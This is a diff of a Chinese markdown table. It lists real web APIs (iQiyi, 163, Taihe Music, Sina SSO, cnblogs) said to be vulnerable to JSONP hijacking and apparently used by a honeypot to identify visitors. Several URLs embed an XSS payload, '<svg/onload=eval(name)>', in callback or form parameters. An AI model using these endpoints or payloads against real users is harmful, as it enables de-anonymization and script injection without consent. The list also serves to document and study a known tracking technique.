@@ -7,8 +7,7 @@ X安蜜罐用的一些存在JSonp劫持的API
 | ---- | ---- |
 | http://api-live.iqiyi.com/stream/geth5?qd_tm=1553094041094&&xxoo=chrome-extension://&typeId=1&platform=7&vid=0&qd_vip=0&qd_uid=2327344064&qd_ip=x.x.x.x&qd_vipres=0&qd_src=h5_xiu&qd_tvid=0&_=1553094041094&callback=%3Csvg/onload=eval(name)%3E | 爱奇艺 |
 | http://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/users/myInfo?ibc=newspc&callback=jsonp_1576488793844&_=1576488793845 | 163 |
-| http://musicapi.taihe.com/v1/restserver/ting?from=web&format=json&param=LSybM0sdw2aqEfumhdonnx8fVeIHBQtuiPCKUtmcDzyQAMZmL9gayz8xP%2FHmDp%2BH&timestamp=1574934266&sign=6d4fb00655a40b21407243b6be7274a4&
-method=baidu.ting.ugccenter.getUserBaseInfo&callback=? | 泰禾音乐集团 |
+| http://musicapi.taihe.com/v1/restserver/ting?from=web&format=json&param=LSybM0sdw2aqEfumhdonnx8fVeIHBQtuiPCKUtmcDzyQAMZmL9gayz8xP%2FHmDp%2BH&timestamp=1574934266&sign=6d4fb00655a40b21407243b6be7274a4&method=baidu.ting.ugccenter.getUserBaseInfo&callback=? | 泰禾音乐集团 |
 | https://login.sina.com.cn/sso/prelogin.php?entry=weibo&su=&rsakt=mod&client=ssologin.js(v1.4.19)&_=1552901735056&callback=? | 渣浪 |
 | http://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/users/0/dailyAchv?ibc=newspc&from=all&callback=? | 163评论 |
 | https://wz.cnblogs.com/create?t=xxxx&xxoo=chrome-extension://&&u=%22%3E%3Csvg/onload=eval(name)%3E&c=&i=0 | 博客园 |
